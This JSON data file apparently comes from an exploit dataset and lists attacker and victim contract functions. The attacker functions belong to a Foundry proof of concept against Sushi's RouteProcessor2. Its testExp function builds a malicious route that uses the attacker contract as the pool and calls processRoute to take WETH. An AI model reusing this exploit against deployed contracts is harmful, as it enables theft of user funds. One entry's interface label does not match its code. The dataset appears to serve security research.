[
  {
    "contract/interface": "IUniswapV3Pool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(\n        uint16 _dstChainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        address payable _refundAddress,\n        uint256 _amountLD,\n        uint256 _minAmountLD,\n        lzTxObj memory _lzTxParams,\n        bytes calldata _to,\n        bytes calldata _payload\n    ) external payable;\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_007_841);\n\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(LINK), \"LINK\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SushiExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        uint8 commandCode = 1;\n        uint8 num = 1;\n        uint16 share = 0;\n        uint8 poolType = 1;\n        address pool = address(this);\n        uint8 zeroForOne = 0;\n        address recipient = address(0);\n        bytes memory route =\n            abi.encodePacked(commandCode, address(LINK), num, share, poolType, pool, zeroForOne, recipient);\n        console.log(\"WETH balance before attack: %d\\n\", WETH.balanceOf(address(this)));\n\n        processor.processRoute(\n            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, //native token\n            0,\n            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,\n            0,\n            0x0000000000000000000000000000000000000000,\n            route\n        );\n\n        console.log(\"WETH balance after  attack: %d\\n\", WETH.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRouteProcessor2",
    "source_type": "victim_contract",
    "function_name": "processRoute",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRouteProcessor2",
    "source_type": "victim_contract",
    "function_name": "tridentCLSwapCallback",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRouteProcessor2",
    "source_type": "victim_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "",
    "description": ""
  }
]